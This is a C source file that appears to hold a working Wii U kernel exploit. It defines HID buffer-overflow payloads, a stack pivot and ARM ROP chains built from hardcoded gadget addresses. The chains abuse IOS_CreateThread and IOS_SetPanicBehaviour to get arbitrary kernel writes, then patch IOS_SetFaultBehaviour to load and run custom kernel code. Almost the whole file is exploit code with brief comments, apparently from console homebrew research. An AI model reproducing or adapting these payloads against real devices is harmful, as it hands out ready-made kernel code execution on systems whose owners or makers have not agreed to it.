#include <stdint.h>

// the location of the final rop chain after the stack pivot
#define ROP_CHAIN_LOCATION 0x12155e38

// somewhere behind the IOS-PAD bss
// stores the arm kernel binary before it gets copied into kernel memory
#define ARM_KERNEL_LOCATION 0x12158500

// the beginning of IOS_SetFaultBehaviour
// this is the syscall we patch to execute functions with kernel permissions
#define REPLACE_SYSCALL 0x081298bc

// the location from where our arm kernel binary runs
#define ARM_CODE_BASE 0x08135000

#define BE32 __builtin_bswap32

#define DEFINE_PAYLOAD(name, ...) \
    struct __attribute__((packed)) { \
        uint8_t hid_cmd; \
        uint8_t hid_buffer[58]; \
        uint32_t overflow[6]; \
        uint32_t rop[sizeof((uint32_t[]){__VA_ARGS__}) / sizeof(uint32_t)]; \
    } name = { \
        .hid_cmd = 0xa1, \
        .hid_buffer = {}, \
        .overflow = {}, \
        .rop = {__VA_ARGS__} \
    }

/*
    We'll use a flaw in IOS_Create thread to memset code with kernel permissions
    <https://wiiubrew.org/wiki/Wii_U_system_flaws#ARM_kernel>

    We can use this to nop out parts of code
*/
#define IOS_CREATE_THREAD(function, arg, stack_top, stack_size, priority, flags) \
    BE32(0x11f1a7a2 | 1), /* pop {r0, r1, r2, r3, r5, r6, r7, pc} */ \
    BE32(function), \
    BE32(arg), \
    BE32(stack_top), \
    BE32(stack_size), \
    BE32(0x00000000), \
    BE32(0x00000000), \
    BE32(0x00000000), \
    BE32(0x11f82e68), /* IOS_CreateThread */ \
    BE32(priority), \
    BE32(flags)

/*
    When nop'ing out 08129734-0812974c IOS_SetPanicBehaviour can be turned into an arbitrary write
*/
#define KERN_WRITE32(address, value) \
    BE32(0x11f19cde | 1), /* pop {r0, r1, r3, r4, r5, r7, pc} */ \
    BE32(0x00000000), \
    BE32(value), \
    BE32(0x00000001), /* r3 must be 1 for the arbitrary write */ \
    BE32(address), \
    BE32(0x00000000), \
    BE32(0x00000000), \
    BE32(0x11f10244), /* mov r12, r4; mov r0, r12; pop { r4, pc } */ \
    BE32(0x00000000), \
    BE32(0x11f83210), /* IOS_SetPanicBehaviour */ \
    BE32(0x00000000), \
    BE32(0x00000000)

/*
some notes if we wan't to recover after overflowing the buffer:
we either have 19 * 4 stack bytes and can then jump to 11f07da8
or 9 * 4 stack bytes and jump to 11f07b2c
*/

/*
    Payload to write data into memory

    hid_buffer = data
    rop[1]     = dest
    rop[3]     = size

    this will skip freebuf so the amount of upload payloads you can send is limited
*/
DEFINE_PAYLOAD(upload_data_payload,
    // copy the hid buffer to the destination
    BE32(0x11f13ca2 | 1), // pop {r0, r1, r2, r4, r7, pc}
    BE32(0x00000000), // dest
    BE32(0x1215636a), // src
    BE32(0x00000000), // size
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x11f0071c), // bl memcpy; mov r3, #0x0; mov r0, r3; ldmia sp!,{ r4, r5, pc }
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x11f07b2c), // jump back to normal execution
);

/*
    Pivots the stack by -0x600 which will be ROP_CHAIN_LOCATION
*/
DEFINE_PAYLOAD(stackpivot_payload,
    // pivot the stack
    BE32(0x11f1a79a | 1), // pop {r0, r1, r3, pc}
    BE32(0x11f00728), // pop {r4, r5, pc} (will be in lr)
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x11f7ee10), // mov lr, r0; mov r0, lr; add sp, sp, #8; ldm sp!, {pc}
    BE32(0x00000000),
    BE32(0x00000000),
    // nop out unneeded code to properly continue after the stack pivot 
    IOS_CREATE_THREAD(0, 0, 0x11f005c0, 0x68, 0x01, 0x02),
    BE32(0x11f13ee6 | 1), // pop {r1, r2, pc}
    BE32(0x00000000),
    BE32(0xfffffa00), // stack offset (-0x600)
    BE32(0x11f007bc), // pop {r4-r11, pc}
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x00000006), // r11 needs to be 6 to pivot the stack
    BE32(0x11f82e14), // stack pivot
);

/*
    final_rop_chain[184] = kern bin size
*/
uint32_t final_rop_chain[] = {
    BE32(0x11f1a79a | 1), // pop {r0, r1, r3, pc}
    BE32(0x11f00728), // pop {r4, r5, pc} (will be in lr)
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x11f7ee10), // mov lr, r0; mov r0, lr; add sp, sp, #8; ldm sp!, {pc}
    BE32(0x00000000),
    BE32(0x00000000),
    // nop out parts of IOS_SetPanicBehaviour for KERN_WRITE32
    IOS_CREATE_THREAD(0, 0, 0x0812974c, 0x68, 0x01, 0x02),
    // patch IOS_SetFaultBehaviour to load our custom kernel code
    KERN_WRITE32(REPLACE_SYSCALL + 0x00, 0xe92d4010), // push { r4, lr }
    KERN_WRITE32(REPLACE_SYSCALL + 0x04, 0xe1a04000), // mov r4, r0
    KERN_WRITE32(REPLACE_SYSCALL + 0x08, 0xe3e00000), // mov r0, #0xffffffff
    KERN_WRITE32(REPLACE_SYSCALL + 0x0c, 0xee030f10), // mcr p15, #0, r0, c3, c0, #0 (set dacr to r0)
    KERN_WRITE32(REPLACE_SYSCALL + 0x10, 0xe1a00004), // mov r0, r4
    KERN_WRITE32(REPLACE_SYSCALL + 0x14, 0xe12fff33), // blx r3
    KERN_WRITE32(REPLACE_SYSCALL + 0x18, 0x00000000), // nop
    KERN_WRITE32(REPLACE_SYSCALL + 0x1c, 0xee17ff7a), // clean_loop: mrc p15, 0, r15, c7, c10, 3
    KERN_WRITE32(REPLACE_SYSCALL + 0x20, 0x1afffffd), // bne clean_loop
    KERN_WRITE32(REPLACE_SYSCALL + 0x24, 0xee070f9a), // mcr p15, 0, r0, c7, c10, 4
    KERN_WRITE32(REPLACE_SYSCALL + 0x28, 0xe1a03004), // mov r3, r4
    KERN_WRITE32(REPLACE_SYSCALL + 0x2c, 0xe8bd4010), // pop { r4, lr }
    KERN_WRITE32(REPLACE_SYSCALL + 0x30, 0xe12fff13), // bx r3 (our code)
    BE32(0x11f1a79a | 1), // pop {r0, r1, r3, pc}
    BE32(REPLACE_SYSCALL),
    BE32(0x00004001), // > 0x4000 flushes all data cache
    BE32(0x00000000),
    BE32(0x11f830f8), // IOS_FlushDCache
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x11f1a7a2 | 1), // pop {r0, r1, r2, r3, r5, r6, r7, pc}
    BE32(ARM_CODE_BASE), // dst
    BE32(ARM_KERNEL_LOCATION), // src
    BE32(0x00000000), // size
    BE32(0x08131d04), // kern_memcpy
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x11f82f60), // IOS_SetFaultBehaviour (our patched syscall to gain kernel code execution)
    BE32(0x00000000),
    BE32(0x00000000),
    BE32(0x11f85800), // jump to arm_user
};

/* just a payload I used for testing */
DEFINE_PAYLOAD(shutdown_payload,
    // jump to ios_shutdown
    BE32(0x11f831f8),
);
